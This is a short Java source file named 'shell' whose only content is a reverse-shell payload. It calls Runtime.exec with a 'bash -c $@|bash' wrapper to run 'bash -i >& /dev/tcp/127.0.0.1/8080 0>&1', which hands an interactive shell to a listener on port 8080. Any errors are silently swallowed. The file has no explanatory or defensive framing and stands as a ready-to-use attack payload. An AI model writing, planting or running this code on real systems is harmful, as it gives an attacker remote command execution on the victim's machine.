public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/127.0.0.1/8080 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}